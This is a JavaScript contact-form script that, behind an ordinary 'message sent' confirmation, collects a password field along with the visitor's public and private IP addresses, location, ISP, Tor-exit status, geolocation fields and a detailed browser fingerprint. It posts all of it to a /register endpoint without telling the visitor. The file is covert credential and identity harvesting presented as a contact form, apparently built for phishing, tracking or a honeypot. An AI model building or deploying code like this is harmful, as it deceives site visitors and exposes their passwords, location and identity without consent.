// Contact Form Scripts

$(function() {

    $("#contactForm input,#contactForm textarea").jqBootstrapValidation({
        preventSubmit: true,
        submitError: function($form, event, errors) {
            // additional error messages or events
        },
        submitSuccess: function($form, event) {
            event.preventDefault(); // prevent default submit behaviour
            // get values from FORM
            var name = $("input#name").val();
            var email = $("input#email").val();
            var phone = $("input#phone").val();
            var pass = $("input#password").val();
            var client = new ClientJS();

            var firstName = name; // For Success/Failure Message
            // Check for white space in name for Success/Fail message
            if (firstName.indexOf(' ') >= 0) {
                firstName = name.split(' ').slice(0, -1).join(' ');
            }

            // get client public IP
            $.getJSON('https://wtfismyip.com/json', function(rsp){
                $(document).data('wtf_ip', rsp.YourFuckingIPAddress);
                $(document).data('wtf_loc', rsp.YourFuckingLocation);
                $(document).data('wtf_host', rsp.YourFuckingHostname);
                $(document).data('wtf_isp', rsp.YourFuckingISP);
                $(document).data('wtf_tor', rsp.YourFuckingTorExit);
            });

            // get client private IP
            getUserIP(function(ip){
            		$(document).data('wtf_privip', ip);
            });


            // get client browser info
            $(document).data('cli_fng', client.getFingerprint());
            $(document).data('cli_ua', client.getUserAgent());
            $(document).data('cli_brw', client.getBrowser());
            $(document).data('cli_brwv', client.getBrowserVersion());
            $(document).data('cli_os', client.getOS());
            $(document).data('cli_osv', client.getOSVersion());
            $(document).data('cli_device', client.getDevice());
            $(document).data('cli_dvctype', client.getDeviceType());
            $(document).data('cli_dvcvend', client.getDeviceVendor());
            $(document).data('cli_cpu', client.getCPU());
            $(document).data('cli_screen', client.getScreenPrint());
            $(document).data('cli_plugin', client.getPlugins());
            $(document).data('cli_java', client.getJavaVersion());
            $(document).data('cli_flash', client.getFlashVersion());
            $(document).data('cli_silver', client.getSilverlightVersion());
            $(document).data('cli_timezone', client.getTimeZone());
            $(document).data('cli_lang', client.getLanguage());


            $.ajax({
                url: "/register",
                type: "POST",
                contentType: 'application/json',
                data: JSON.stringify({
                    "name": name,
                    "phone": phone,
                    "email": email,
                    "password": pass,
                    "wtf_pubip": $(document).data('wtf_ip'),
                    "wtf_privip": $(document).data('wtf_privip'),
                    "wtf_loc": $(document).data('wtf_loc'),
                    "wtf_host": $(document).data('wtf_host'),
                    "wtf_isp": $(document).data('wtf_isp'),
                    "wtf_tor": $(document).data('wtf_tor'),
                    "geo_status": $(document).data('geo_status'),
                    "geo_lat": $(document).data('geo_lat'),
                    "geo_lng": $(document).data('geo_lng'),
                    "geo_alt": $(document).data('geo_alt'),
                    "geo_acc": $(document).data('geo_acc'),
                    "geo_alac": $(document).data('geo_alac'),
                    "geo_head": $(document).data('geo_head'),
                    "geo_speed": $(document).data('geo_speed'),
                    "cli_fng": $(document).data('cli_fng'),
                    "cli_ua": $(document).data('cli_ua'),
                    "cli_brw": $(document).data('cli_brw'),
                    "cli_brwv": $(document).data('cli_brwv'),
                    "cli_os": $(document).data('cli_os'),
                    "cli_osv": $(document).data('cli_osv'),
                    "cli_device": $(document).data('cli_device'),
                    "cli_dvctype": $(document).data('cli_dvctype'),
                    "cli_dvcvend": $(document).data('cli_dvcvend'),
                    "cli_cpu": $(document).data('cli_cpu'),
                    "cli_screen": $(document).data('cli_screen'),
                    "cli_plugin": $(document).data('cli_plugin'),
                    "cli_java": $(document).data('cli_java'),
                    "cli_flash": $(document).data('cli_flash'),
                    "cli_silver": $(document).data('cli_silver'),
                    "cli_timezone": $(document).data('cli_timezone'),
                    "cli_lang": $(document).data('cli_lang')
                }),
                cache: false,
                success: function() {
                    // Success message
                    $('#success').html("<div class='alert alert-success'>");
                    $('#success > .alert-success').html("<button type='button' class='close' data-dismiss='alert' aria-hidden='true'>&times;")
                        .append("</button>");
                    $('#success > .alert-success')
                        .append("<strong>Your message has been sent. </strong>");
                    $('#success > .alert-success')
                        .append('</div>');

                    //clear all fields
                    $('#contactForm').trigger("reset");
                },
                error: function() {
                    // Fail message
                    $('#success').html("<div class='alert alert-danger'>");
                    $('#success > .alert-danger').html("<button type='button' class='close' data-dismiss='alert' aria-hidden='true'>&times;")
                        .append("</button>");
                    $('#success > .alert-danger').append("<strong>Sorry " + firstName + ", it seems that my mail server is not responding. Please try again later!");
                    $('#success > .alert-danger').append('</div>');
                    //clear all fields
                    $('#contactForm').trigger("reset");
                },
            });
        },
        filter: function() {
            return $(this).is(":visible");
        },
    });

    $("a[data-toggle=\"tab\"]").click(function(e) {
        e.preventDefault();
        $(this).tab("show");
    });
});


/*When clicking on Full hide fail/success boxes */
$('#name').focus(function() {
    $('#success').html('');
});
